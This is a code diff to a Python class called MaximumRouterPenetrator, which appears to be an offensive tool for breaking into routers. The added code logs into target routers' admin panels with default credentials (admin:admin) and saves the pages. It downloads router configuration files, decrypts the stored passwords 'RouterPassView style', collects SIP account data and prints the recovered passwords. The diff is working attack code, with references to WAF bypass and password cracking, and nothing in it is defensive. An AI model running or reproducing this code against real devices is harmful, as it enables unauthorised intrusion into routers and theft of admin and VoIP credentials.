@@ -1135,6 +1135,35 @@ class MaximumRouterPenetrator:
                         verbose
                     )
                     
+                    # If Selenium fails, try urllib fallback
+                    if not screenshot_result['success']:
+                        if verbose:
+                            print(f"         🔄 LIVE DEBUG: Selenium failed, trying urllib fallback...")
+                        
+                        try:
+                            import base64
+                            credentials = auth_result.get('credentials', ('admin', 'admin'))
+                            auth_string = f'{credentials[0]}:{credentials[1]}'
+                            auth_bytes = auth_string.encode('ascii')
+                            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
+                            
+                            req = urllib.request.Request(f"http://{target_ip}/admin/")
+                            req.add_header('Authorization', f'Basic {auth_b64}')
+                            response = urllib.request.urlopen(req, timeout=10)
+                            
+                            # Save as HTML file since we can't take screenshot with urllib
+                            html_filename = f"admin_panel_{target_ip}.html"
+                            with open(html_filename, 'w', encoding='utf-8') as f:
+                                f.write(response.read().decode('utf-8', errors='ignore'))
+                            
+                            screenshot_result = {'success': True, 'filename': html_filename, 'method': 'urllib_html'}
+                            if verbose:
+                                print(f"         ✅ Admin panel HTML saved: {html_filename}")
+                                
+                        except Exception as e:
+                            if verbose:
+                                print(f"         ❌ Urllib fallback error: {str(e)[:50]}")
+                    
                     # Advanced bypass for screenshot if Selenium fails
                     if not screenshot_result['success'] and self.advanced_bypass['waf_bypass']:
                         if verbose:
@@ -1277,29 +1306,7 @@ class MaximumRouterPenetrator:
                         for pwd in hidden_passwords['passwords']:
                             print(f"         🔓 {pwd['field_name']}: {pwd['password']} ({pwd['method']})")
             
-            # RouterPassView style extraction from config files
-            if auth_result.get('verified_access') and self.password_extraction['routerpassview_style']:
-                if verbose:
-                    print(f"         🔓 LIVE DEBUG: RouterPassView style extraction...")
-                
-                # Try to get config files first
-                config_result = self._search_and_extract_config_files(target_ip, auth_result, verbose)
-                if config_result['success']:
-                    for config_file in config_result['files']:
-                        content = config_file.get('content', '')
-                        if content:
-                            # Extract passwords using RouterPassView style
-                            routerpassview_passwords = self._routerpassview_style_extraction(
-                                content, 
-                                router_info.get('brand', 'generic'), 
-                                verbose
-                            )
-                            if routerpassview_passwords:
-                                if 'routerpassview_passwords' not in result:
-                                    result['routerpassview_passwords'] = []
-                                result['routerpassview_passwords'].extend(routerpassview_passwords)
-                                if verbose:
-                                    print(f"         ✅ RouterPassView passwords found: {len(routerpassview_passwords)}")
+            # RouterPassView style extraction moved to Phase 6 (Config File Extraction)
             
             # Encrypted password extraction from page content
             if auth_result.get('verified_access') and self.password_extraction['encrypted_field_decryption']:
@@ -1380,17 +1387,44 @@ class MaximumRouterPenetrator:
                 if verbose:
                     print(f"         ✅ SIP data from admin panel: {len(sip_result['sip_data'])} accounts")
             
-            # Search for config files and extract SIP
+            # Search for config files and extract SIP + RouterPassView passwords
             if verbose:
-                print(f"\n📁 PHASE 6: Config File Extraction")
+                print(f"\n📁 PHASE 6: Config File Extraction & RouterPassView Analysis")
                 print(f"   • Searching for configuration files")
                 print(f"   • Downloading and analyzing configs")
+                print(f"   • RouterPassView style password extraction")
                 print(f"   • Cracking protected passwords")
             
             config_result = self._search_and_extract_config_files(target_ip, auth_result, verbose)
             if config_result['success']:
                 result['config_files_found'] = config_result['files']
                 result['sip_from_config'] = config_result['sip_data']
+                
+                # RouterPassView style extraction from downloaded configs
+                if verbose:
+                    print(f"         🔓 LIVE DEBUG: RouterPassView analysis of config files...")
+                
+                total_routerpassview_passwords = []
+                for config_file in config_result['files']:
+                    content = config_file.get('content', '')
+                    if content:
+                        # Extract passwords using RouterPassView style
+                        routerpassview_passwords = self._routerpassview_style_extraction(
+                            content, 
+                            router_info.get('brand', 'generic'), 
+                            verbose
+                        )
+                        if routerpassview_passwords:
+                            total_routerpassview_passwords.extend(routerpassview_passwords)
+                            if verbose:
+                                print(f"         ✅ RouterPassView passwords from {config_file.get('filename', 'unknown')}: {len(routerpassview_passwords)}")
+                
+                if total_routerpassview_passwords:
+                    result['routerpassview_passwords'] = total_routerpassview_passwords
+                    if verbose:
+                        print(f"         ✅ Total RouterPassView passwords found: {len(total_routerpassview_passwords)}")
+                        for pwd in total_routerpassview_passwords:
+                            print(f"         🔓 {pwd['field']}: {pwd['original']} -> {pwd['decrypted']} ({pwd['method']})")
                 if verbose:
                     print(f"         ✅ Config files found: {len(config_result['files'])}")
                     print(f"         📞 SIP data from config: {len(config_result['sip_data'])} accounts")
